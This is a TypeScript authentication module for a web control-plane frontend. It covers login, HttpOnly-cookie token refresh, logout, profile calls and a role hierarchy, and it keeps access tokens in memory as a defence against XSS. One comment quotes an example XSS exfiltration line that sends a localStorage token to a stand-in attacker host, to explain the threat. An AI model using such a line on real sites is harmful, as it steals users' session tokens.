import api, { _registerAccessTokenSource, _registerTokenLifecycle } from './api';

export interface LoginCredentials {
  email: string;
  password: string;
}

export type AuthRole = 'super_admin' | 'admin' | 'operator' | 'viewer';

const VALID_ROLES: ReadonlySet<AuthRole> = new Set([
  'super_admin',
  'admin',
  'operator',
  'viewer',
]);

export interface AuthUser {
  id: string;
  email: string;
  firstName: string;
  lastName: string;
  role: AuthRole;
  avatarUrl?: string;
}

export interface AuthResponse {
  accessToken: string;
  refreshToken?: string;
  refreshExpiresAt?: string;
  user: AuthUser;
}

const USER_KEY = 'control_plane_user';
// Legacy keys that may still exist in localStorage from the pre-W1
// build. We clear them on every auth event to make sure no XSS payload
// can read a leftover token after the user logs in or refreshes a tab.
const LEGACY_TOKEN_KEY = 'control_plane_token';
const LEGACY_REFRESH_KEY = 'control_plane_refresh';

// F089 (W1 task 10): the access token lives in this module-scoped
// variable, NOT in localStorage. XSS payloads that target localStorage
// (the standard exfil pattern: `fetch('//attacker/?'+localStorage.token)`)
// no longer find anything. The refresh token is set as an HttpOnly
// cookie by the backend (F089 backend half) and is never visible to
// JS.
let inMemoryAccessToken: string | null = null;

function setAccessToken(token: string | null): void {
  inMemoryAccessToken = token;
  // Belt-and-suspenders: scrub legacy keys on every set so a partial
  // upgrade can't leave a token at HEAD.
  scrubLegacyTokens();
}

function scrubLegacyTokens(): void {
  try {
    localStorage.removeItem(LEGACY_TOKEN_KEY);
    localStorage.removeItem(LEGACY_REFRESH_KEY);
  } catch {
    // tolerated — localStorage may be disabled
  }
}

function clearLocalAuth(): void {
  inMemoryAccessToken = null;
  scrubLegacyTokens();
  try {
    localStorage.removeItem(USER_KEY);
  } catch {
    // tolerated
  }
}

function isAuthUser(value: unknown): value is AuthUser {
  if (!value || typeof value !== 'object') return false;
  const v = value as Record<string, unknown>;
  return (
    typeof v.id === 'string' &&
    typeof v.email === 'string' &&
    typeof v.firstName === 'string' &&
    typeof v.lastName === 'string' &&
    typeof v.role === 'string' &&
    VALID_ROLES.has(v.role as AuthRole)
  );
}

// Wire the in-memory token to api.ts's interceptor + refresh flow.
// auth.ts owns the variable; api.ts reads it through these getters/
// setters. Registered at module init so the interceptor sees the right
// state from the first request onwards.
_registerAccessTokenSource(() => inMemoryAccessToken);
_registerTokenLifecycle(
  (token) => setAccessToken(token),
  () => clearLocalAuth(),
);

export const authService = {
  async login(credentials: LoginCredentials): Promise<AuthResponse> {
    const response = await api.post<AuthResponse>('/auth/login', credentials);
    const { accessToken, user } = response.data;

    // F089: access token in memory. Refresh token arrives via Set-Cookie
    // header set by the backend (HttpOnly, SameSite=Strict, Secure on
    // https); the frontend never sees it. We persist `user` in
    // localStorage because it's not a credential and the AuthContext
    // restores it on tab reload — but the access token is gone after
    // any reload, so a reload always re-authenticates (silent refresh
    // via the cookie if still valid; otherwise redirect to login).
    setAccessToken(accessToken);
    try {
      localStorage.setItem(USER_KEY, JSON.stringify(user));
    } catch {
      // tolerated
    }

    return response.data;
  },

  /**
   * Exchange the HttpOnly refresh-token cookie for a fresh access
   * token. The cookie is sent automatically because api.ts has
   * withCredentials: true. The 401 interceptor calls this; on failure
   * it falls back to clearing local state and redirecting to /login.
   */
  async refresh(): Promise<string> {
    const response = await api.post<AuthResponse>(
      '/auth/refresh',
      // No body — the refresh token is in the HttpOnly cookie. We send
      // an empty object so the backend's body parser is happy.
      {},
      // Mark the refresh request itself so the 401 interceptor never
      // recursively tries to refresh the refresh call.
      { headers: { 'X-Skip-Auth-Refresh': 'true' } },
    );
    const { accessToken, user } = response.data;
    setAccessToken(accessToken);
    if (user) {
      try {
        localStorage.setItem(USER_KEY, JSON.stringify(user));
      } catch {
        // tolerated
      }
    }
    return accessToken;
  },

  clearLocal(): void {
    clearLocalAuth();
  },

  // Best-effort server-side logout. The control-plane revokes the access
  // token's `jti` so a stolen bearer token cannot be replayed AND clears
  // the HttpOnly refresh-token cookie. The client unconditionally clears
  // local state and redirects after the call - if the network errored
  // the worst case is that the token remains valid until natural
  // expiry, which is no worse than the prior behaviour.
  async logout(): Promise<void> {
    try {
      await api.post('/auth/logout');
    } catch {
      // Intentionally swallow: see comment above.
    }
    clearLocalAuth();
    window.location.href = '/login';
  },

  getToken(): string | null {
    return inMemoryAccessToken;
  },

  getUser(): AuthUser | null {
    let userStr: string | null;
    try {
      userStr = localStorage.getItem(USER_KEY);
    } catch {
      return null;
    }
    if (!userStr) return null;
    try {
      const parsed = JSON.parse(userStr);
      if (!isAuthUser(parsed)) {
        clearLocalAuth();
        return null;
      }
      return parsed;
    } catch {
      clearLocalAuth();
      return null;
    }
  },

  isAuthenticated(): boolean {
    return !!this.getToken();
  },

  async getProfile(): Promise<AuthUser> {
    const response = await api.get<AuthUser>('/auth/me');
    try {
      localStorage.setItem(USER_KEY, JSON.stringify(response.data));
    } catch {
      // tolerated
    }
    return response.data;
  },

  async updateProfile(data: { firstName?: string; lastName?: string; avatarUrl?: string }): Promise<AuthUser> {
    const response = await api.put<AuthUser>('/auth/me', data);
    try {
      localStorage.setItem(USER_KEY, JSON.stringify(response.data));
    } catch {
      // tolerated
    }
    return response.data;
  },

  async changePassword(currentPassword: string, newPassword: string): Promise<void> {
    await api.post('/auth/change-password', { currentPassword, newPassword });
  },

  hasRole(requiredRole: AuthRole | AuthRole[]): boolean {
    const user = this.getUser();
    if (!user) return false;

    const roleHierarchy: Record<AuthRole, number> = {
      super_admin: 4,
      admin: 3,
      operator: 2,
      viewer: 1,
    };

    if (Array.isArray(requiredRole)) {
      return requiredRole.some(
        (role) => roleHierarchy[user.role] >= roleHierarchy[role],
      );
    }

    return roleHierarchy[user.role] >= roleHierarchy[requiredRole];
  },
};

export default authService;
